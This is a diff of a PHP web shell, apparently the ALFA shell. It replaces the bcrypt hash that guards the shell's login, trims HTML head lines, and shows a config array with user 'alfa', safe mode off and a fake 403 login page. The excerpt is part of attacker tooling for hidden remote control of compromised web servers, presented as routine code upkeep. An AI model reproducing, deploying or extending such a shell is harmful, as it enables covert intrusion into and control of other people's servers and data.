@@ -2,15 +2,11 @@
 session_start();
 
 // ========== UBAH KE BCRYPT ==========
-$password_hash = '$2a$12$2rvrbHRzOS1FtVdLNLZ6IOMDdsX9FKCGpB5bC4Usc9itwgpigzgiO';
+$password_hash = '$2a$12$STUWNFbBdl9i3aOPVSTcQ.6HmRQPsPUiZvypzfBxNDQc81w5yIbgK';
 
 function login_shell()
 {
 ?>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HI,</title>
     <style>
         * {
@@ -340,7 +336,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '$2a$12$2rvrbHRzOS1FtVdLNLZ6IOMDdsX9FKCGpB5bC4Usc9itwgpigzgiO', // BCRYPT
+    'password' => '$2a$12$STUWNFbBdl9i3aOPVSTcQ.6HmRQPsPUiZvypzfBxNDQc81w5yIbgK', // BCRYPT
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
